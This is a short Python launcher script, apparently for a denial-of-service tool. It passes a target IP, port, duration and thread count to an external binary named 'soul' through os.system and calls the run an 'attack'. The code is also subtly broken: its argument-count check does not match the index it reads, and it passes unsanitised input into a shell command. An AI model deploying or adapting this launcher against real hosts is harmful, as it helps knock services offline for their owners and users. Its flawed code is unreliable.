# runner.py - Place this inside VPS under 'freeroot'

import sys
import os
import threading
import time

# Argument validation
if len(sys.argv) != 5:
    print("Usage: python3 runner.py <ip> <port> <time> <threads> <value>")
    exit()

# Parse arguments
ip = sys.argv[1]
port = sys.argv[2]
attack_time = int(sys.argv[3])
threads = sys.argv[4]
value = sys.argv[5]  # example: -1, 0, -2

# Attack function
def run_attack():
    os.system(f"./soul {ip} {port} {attack_time} {threads} {value}")

# Start attack in a daemon thread (will exit cleanly)
attack_thread = threading.Thread(target=run_attack, daemon=True)
attack_thread.start()

# Sleep for duration then exit
time.sleep(attack_time)
print("Attack finished, exiting runner.py...")
sys.exit(0)